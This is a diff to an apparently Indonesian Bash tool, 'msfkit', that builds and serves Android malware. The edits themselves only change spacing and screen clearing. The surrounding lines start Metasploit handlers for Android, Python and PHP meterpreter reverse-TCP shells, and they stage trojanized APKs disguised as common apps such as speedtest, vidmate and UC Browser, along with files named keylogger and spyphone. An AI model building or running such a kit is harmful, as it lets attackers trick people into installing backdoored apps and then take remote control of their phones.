@@ -443,7 +443,7 @@ echo
 sleep 0.01
 echo $me"----------------------------------------------------";
 sleep 0.01
-echo $hi"               aktifasi database                    ";
+echo $hi"                aktifasi database                   ";
 sleep 0.01
 echo $me"----------------------------------------------------";
 sleep 0.01
@@ -531,7 +531,8 @@ echo "----------------------------------------------------";
 echo $hi
 sleep 0.01
 read -p "masukan port : " p
-echo
+sleep 2
+clear
 echo $hi"[+] RUN Please Wait!!"
 echo
 msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $l;set LPORT $p;exploit;"
@@ -615,7 +616,8 @@ echo "----------------------------------------------------";
 echo $hi
 sleep 0.01
 read -p "masukan port : " p
-echo
+sleep 2
+clear
 echo $hi"[+] RUN Please Wait!!"
 echo
 msfconsole -x "use exploit/multi/handler;set payload python/meterpreter/reverse_tcp;set LHOST $l;set LPORT $p;exploit;"
@@ -699,7 +701,8 @@ echo "----------------------------------------------------";
 echo $hi
 sleep 0.01
 read -p "masukan port : " p
-echo
+sleep 2
+clear
 echo $hi"[+] RUN Please Wait!!"
 echo
 msfconsole -x "use exploit/multi/handler;set payload php/meterpreter/reverse_tcp;set LHOST $l;set LPORT $p;exploit;"
@@ -732,7 +735,7 @@ ipori
 echo $me
 clear
 mallware
-echo $hi"                 wait for 35 minutes            "
+echo $hi"                  wait for 35 minutes            "
 echo
 cd && cd msfkit && cd Payload
 mv -f speedtest.apk ../Malware && cd && cd msfkit && cd Malware
@@ -756,7 +759,7 @@ ipori
 echo $me
 clear
 mallware
-echo $hi"                 wait for 35 minutes            "
+echo $hi"                  wait for 35 minutes            "
 echo
 cd && cd msfkit && cd Payload
 mv -f keyboard_hacker.apk ../Malware && cd && cd msfkit && cd Malware
@@ -780,7 +783,7 @@ ipori
 echo $me
 clear
 mallware
-echo $hi"                wait for 35 minutes             ";
+echo $hi"                 wait for 35 minutes             ";
 echo
 cd && cd msfkit && cd Payload
 mv -f G45_Hacking.apk ../Malware && cd && cd msfkit && cd Malware
@@ -805,7 +808,7 @@ ipori
 echo $me
 clear
 mallware
-echo $hi"                 wait for 35 minutes            "
+echo $hi"                  wait for 35 minutes            "
 echo
 cd && cd msfkit && cd Payload
 mv -f keyloager.apk ../Malware && cd && cd msfkit && cd Malware
@@ -829,7 +832,7 @@ ipori
 echo $me
 clear
 mallware
-echo $hi"                 wait for 35 minutes            "
+echo $hi"                  wait for 35 minutes            "
 echo
 cd && cd msfkit && cd Payload
 mv -f wps_hack.apk ../Malware && cd && cd msfkit && cd Malware
@@ -853,7 +856,7 @@ ipori
 echo $me
 clear
 mallware
-echo $hi"                 wait for 35 minutes            "
+echo $hi"                  wait for 35 minutes            "
 echo
 cd && cd msfkit && cd Payload
 mv -f droid_sqli.apk ../Malware && cd && cd msfkit && cd Malware
@@ -877,7 +880,7 @@ ipori
 echo $me
 clear
 mallware
-echo $hi"                 wait for 35 minutes            "
+echo $hi"                  wait for 35 minutes            "
 echo
 cd && cd msfkit && cd Payload
 mv -f vidmate.apk ../Malware && cd && cd msfkit && cd Malware
@@ -901,7 +904,7 @@ ipori
 echo $me
 clear
 mallware
-echo $hi"                 wait for 35 minutes            "
+echo $hi"                  wait for 35 minutes            "
 echo
 cd && cd msfkit && cd Payload
 mv -f uc.apk ../Malware && cd && cd msfkit && cd Malware
@@ -925,7 +928,7 @@ ipori
 echo $me
 clear
 mallware
-echo $hi"                 wait for 35 minutes            "
+echo $hi"                  wait for 35 minutes            "
 echo
 cd && cd msfkit && cd Payload
 mv -f lk21.apk ../Malware && cd && cd msfkit && cd Malware
@@ -949,7 +952,7 @@ ipori
 echo $me
 clear
 mallware
-echo $hi"                 wait for 35 minutes            "
+echo $hi"                  wait for 35 minutes            "
 echo
 cd && cd msfkit && cd Payload
 mv -f indoxxi.apk ../Malware && cd && cd msfkit && cd Malware
@@ -973,7 +976,7 @@ ipori
 echo $me
 clear
 mallware
-echo $hi"                 wait for 35 minutes            "
+echo $hi"                  wait for 35 minutes            "
 echo
 cd && cd msfkit && cd Payload
 mv -f design.apk ../Malware && cd && cd msfkit && cd Malware
@@ -1035,7 +1038,7 @@ ipori
 echo $me
 clear
 mallware
-echo "                   wait for 35 minutes              "
+echo "                    wait for 35 minutes              "
 echo $cy
 cd && cd msfkit && cd Payload
 mv -f SiMontok.apk ../Malware && cd && cd msfkit && cd Malware
@@ -1076,7 +1079,7 @@ ipori
 echo $me
 clear
 mallware
-echo $hi"                 wait for 35 minutes            "
+echo $hi"                  wait for 35 minutes            "
 echo
 cd && cd msfkit && cd Payload
 mv -f spyphone.apk ../Malware && cd && cd msfkit && cd Malware
